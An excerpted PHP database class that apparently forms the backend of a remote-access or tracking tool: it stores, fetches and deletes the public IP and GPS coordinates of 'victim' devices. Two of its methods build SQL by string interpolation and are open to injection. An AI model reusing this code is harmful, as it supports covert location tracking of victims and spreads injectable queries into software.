...
class Clients extends Database
{
	...
	public function removeClient($clientID)
	{
		try {
			...
			$sql = "DELETE FROM location WHERE vicid = :id";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['id' => $clientID]);			
	...
	// updates location of victim device using vicid
	public function updateLocation($vicID, $publicip, $latitude, $longitude)
	{
		$pdo = $this->Connect();
		$sql = "INSERT INTO location(vicid, publicip, latitude, longitude) VALUES(\"$vicID\", \"$publicip\", \"$latitude\", \"$longitude\")";
		$stmt = $pdo->prepare($sql);
		$stmt->execute();
	}

	// retrive Geo latitude and longitude of victim device using vicid
	public function getLocation($vicID)
	{
		try {
			$pdo = $this->Connect();
			$sql = "SELECT * FROM location WHERE vicid = $vicID";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			$data = $stmt->fetch();
			return $data;
